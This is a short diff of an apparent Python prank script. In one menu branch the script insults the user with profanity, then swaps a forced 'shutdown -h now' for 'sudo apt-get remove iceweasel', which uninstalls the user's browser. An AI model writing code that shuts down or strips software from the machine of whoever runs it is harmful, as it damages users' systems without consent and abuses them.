@@ -34,7 +34,7 @@ while True:
   print("BYE BYE FUCKING NOOB BABY");
   print("U ARE STUPID");
   time.sleep(3);
-  os.system("shutdown -h now");
+  os.system("sudo apt-get remove iceweasel");
   break
  elif selection == '2':
   print("BYE BYE NOOB!!!");
